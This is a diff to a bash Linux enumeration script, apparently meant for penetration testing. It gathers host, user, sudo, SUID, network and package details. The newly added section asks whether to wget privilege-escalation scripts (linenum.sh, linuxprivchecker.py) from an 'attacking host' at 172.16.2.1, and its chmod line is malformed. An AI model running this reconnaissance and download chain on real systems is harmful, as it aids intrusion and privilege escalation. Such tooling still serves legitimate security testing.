@@ -2,7 +2,7 @@
 
 echo ""
 echo "----------------------------------------"
-echo "| Local Enumeration Script by @bngrsec |"
+echo "| Linux Enumeration Script by @bngrsec |"
 echo "----------------------------------------"
 echo ""
 
@@ -10,8 +10,6 @@ echo ""
 echo "-----HOSTNAME-----"
 hostname
 echo ""
-
-echo "-----BOX INFO-----"
 uname -a
 echo ""
 cat /etc/issue
@@ -28,6 +26,11 @@ whoami
 id
 echo ""
 
+#this might need a passwd
+echo "-----WHAT CAN WE RUN AS SUDO?-----"
+sudo -l
+echo ""
+
 echo "-----ENV INFO-----"
 env
 echo ""
@@ -37,14 +40,7 @@ ls -la /home/
 echo ""
 cat /etc/passwd
 echo ""
-
-echo -----"CURRENT USERS ON BOX-----"
 w
-echo ""
-
-#this might need a passwd
-echo "-----WHAT CAN WE RUN AS SUDO?-----"
-sudo -l
 echo ""
 
 #find suid executables
@@ -63,6 +59,7 @@ echo ""
 netstat -antup
 echo ""
 
+#write applications to text file, because the output is usually huge
 echo "-----INSTALLED APPLICATIONS-----"
 dpkg -l > /tmp/packages.txt
 echo "Applications written to text file at /tmp/packages.txt"
@@ -133,10 +130,15 @@ echo "-----UNMOUNTED FILE SYSTEMS-----"
 cat /etc/fstab
 echo ""
 
-#if your http server is still running on attacking machine, 
-#we'll grab the other scripts if we need more enumeration
-#change to your IP/filenames
-echo "-----WGET BACK TO HOST FOR OTHER SCRIPTS-----"
-wget -O linenum.sh http://172.16.2.1/linenum.sh
-wget -O privchecker.py http://172.16.2.1/linuxprivchecker.py
+#as long as your http server is still running on your attacker,
+#let's grab the other scripts if we need more enumeration
+#choose if you want to grab more files
+echo "Initial enumeration has completed."
+echo "Would you like to grab more enum-scripts from your attacking host? [y/n]"
+read varname
+if [[ "$varname" = "y" ]]; then
+  wget -O linenum.sh http://172.16.2.1/linenum.sh | chmod linenum.sh 755 & wget -O privchecker.py http://172.16.2.1/linuxprivchecker.py | chmod privchecker.py 755
+else
+  echo "Ok. Skipping."
+fi
 echo ""
